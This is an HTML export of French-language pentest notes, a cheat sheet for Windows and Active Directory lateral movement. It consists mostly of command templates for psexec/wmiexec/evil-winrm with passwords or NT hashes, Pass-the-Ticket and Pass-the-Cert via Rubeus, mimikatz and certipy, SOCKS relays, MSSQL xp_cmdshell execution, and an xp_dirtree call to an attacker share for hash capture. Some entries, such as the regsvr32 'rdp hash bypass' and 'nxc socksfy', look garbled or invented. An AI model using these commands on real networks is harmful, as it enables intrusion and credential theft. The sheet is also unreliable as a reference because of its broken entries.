<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>13-Lateral Movement</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>13-Lateral Movement</h1><br/><p><strong>Phase 13 — Lateral Move &amp; Pivot Techniques</strong></p><p><ol><li>1. <h2>1. Avec mot de passe clair</h2></p><p></li></ol><table class="table"><tr><th>Catégorie</th><th>Commandes / outils</th><th>Privilege obtenu</th></tr><tr><td>Shell interactif (PSExec)</td><td>psexec.py &lt;dom&gt;/&lt;user&gt;:&lt;pwd&gt;@&lt;ip&gt; · psexec.exe -accepteula \\&lt;ip&gt;</td><td>SYSTEM</td></tr><tr><td>Pseudo-shell (SMB-exec)</td><td>atexec.py … -c &quot;cmd&quot; · smbexec.py · wmiexec.py · dcomexec.py</td><td>Admin</td></tr><tr><td>WinRM</td><td>evil-winrm -i &lt;ip&gt; -u &lt;user&gt; -p &lt;pwd&gt; · Enter-PSSession -ComputerName &lt;pc&gt; -Credential &lt;dom&gt;\&lt;user&gt;</td><td>Low → Admin</td></tr><tr><td>RDP</td><td>xfreerdp /u:&lt;user&gt; /d:&lt;dom&gt; /p:&lt;pwd&gt; /v:&lt;ip&gt;</td><td>Low / Admin</td></tr><tr><td>SMB share crawl</td><td>smbclient -U &lt;dom&gt;/&lt;user&gt;%&lt;pwd&gt; //&lt;ip&gt;/C$ · smbmap -H &lt;ip&gt;</td><td>Recherche data</td></tr><tr><td>MSSQL</td><td>mssqlclient.py &lt;dom&gt;/&lt;user&gt;:&lt;pwd&gt;@&lt;ip&gt; → xp_cmdshell</td><td>MSSQL pivots</td></tr></table></p><p><ol><li>2. <h2>2. Avec NT hash (Pass-the-Hash)</h2></p><p></li></ol><table class="table"><tr><th>Transport</th><th>Exemple</th><th>Privilege</th></tr><tr><td>SMB / PSExec</td><td>psexec.py &lt;dom&gt;/&lt;user&gt; -H &lt;hash&gt; @&lt;ip&gt;</td><td>Admin</td></tr><tr><td>RDP sans passwd</td><td>regsvr32 … /hash:&lt;hash&gt; + wfcreg rdp hash bypass</td><td>Low / Admin</td></tr><tr><td>WinRM</td><td>evil-winrm -i &lt;ip&gt; -u &lt;user&gt; -H &lt;hash&gt;</td><td>Low / Admin</td></tr></table></p><p><ol><li>3. <h2>3. Avec Kerberos</h2></p><p></li></ol><table class="table"><tr><th>Action</th><th>Commandes</th><th>Effet</th></tr><tr><td>Pass-the-Ticket</td><td>Rubeus.exe ptt /ticket:&lt;kirbi&gt; · mimikatz kerberos::ptt</td><td>Admin</td></tr><tr><td>Convertir / injecter</td><td>ticketConverter.py → .ccache → impacket tools (-k --no-pass)</td><td> </td></tr><tr><td>Overpass-the-Hash / S4U</td><td>Rubeus asktgt /user:&lt;victim&gt; /rc4:&lt;hash&gt; → PTT</td><td>Admin</td></tr><tr><td>AsKey (impersonation avec SIDKey)</td><td>s4u2self.py … -impersonate Administrator</td><td>Admin</td></tr></table></p><p><ol><li>4. <h2>4. Certificate (pfx) / Pass-the-Cert</h2></li><li>Extraire / obtenir <code>.pfx</code> (ESC1-15, Certipy)</p><p></li></ol><div class="codebox"><pre>Rubeus asktgt /user:<span style="color:#ff9d00;font-weight:700">&lt;</span>usr<span style="color:#ff9d00;font-weight:700">&gt;</span> /certificate:<span style="color:#ff9d00;font-weight:700">&lt;</span>pfxfile<span style="color:#ff9d00;font-weight:700">&gt;</span></pre></div></p><p> → TGT</p><p></p><p><div class="codebox"><pre> certipy auth -pfx <span style="color:#ff9d00;font-weight:700">&lt;</span>pfxfile<span style="color:#ff9d00;font-weight:700">&gt;</span> -ldap-shell / passthecert.py action ldap-shell …</pre></div></p><p><ol><li>Option : <code>certipy cert … -nocert -out user.key</code> + <strong>RBCD</strong> setup.</li></ol></p><p> → <strong>Admin</strong> ou <strong>RBCD</strong> pivot.</p><p></p><p><ol><li>5. <h2>5. SOCKS / Relay tunnels</h2></li><li><code>proxychains socksrelaydump.py &lt;dom&gt;/&lt;user&gt;@&lt;dc_ip&gt;</code></li></ol></p><p><ul><li><code>nxc socksfy &lt;list&gt; -M smb2support</code> → <strong>DCSYNC</strong>, files, MSSQL…</li></ul></p><p><ul><li>Outils Impacket <code>–proxy-host</code>, or <code>proxychains</code> with <code>sockd</code>.</li></ul></p><p></p><p></p><p><ol><li>6. <h2>6. MSSQL pivots</h2></p><p></li></ol><table class="table"><tr><th>Étape</th><th>Commande</th><th>Gain</th></tr><tr><td>Enum</td><td>enum_db, xp_dir_tree, sp_linkedservers</td><td>Découverte</td></tr><tr><td>RCE</td><td>enable_xp_cmdshell · xp_cmdshell &lt;cmd&gt;</td><td>Low → Admin</td></tr><tr><td>Coerce SMB</td><td>EXEC master..xp_dirtree &#39;\\&lt;attacker&gt;\share&#39;</td><td>Hash capture</td></tr></table></p><p><ol><li>7. <h2>7. Livrables de la phase 13</h2></li><li><strong>Chemins de déplacement latéral</strong> validés : PSExec, WinRM, RDP, SMB, MSSQL.</li></ol></p><p><ul><li>Stocks d’artefacts : hash NTLM, tickets <code>.kirbi</code> / <code>.ccache</code>, certificats <code>.pfx</code>.</li></ul></p><p><ul><li><strong>Tunnels SOCKS</strong> prêts pour exploration interne (LDAP, SMB, SQL).</li></ul></p><p><ul><li>Scripts/one-liners réutilisables pour Pass-the-Hash, Pass-the-Ticket, Pass-the-Cert et RBCD.</li></ul></p><p></p><p></p></div>
</body>
</html>
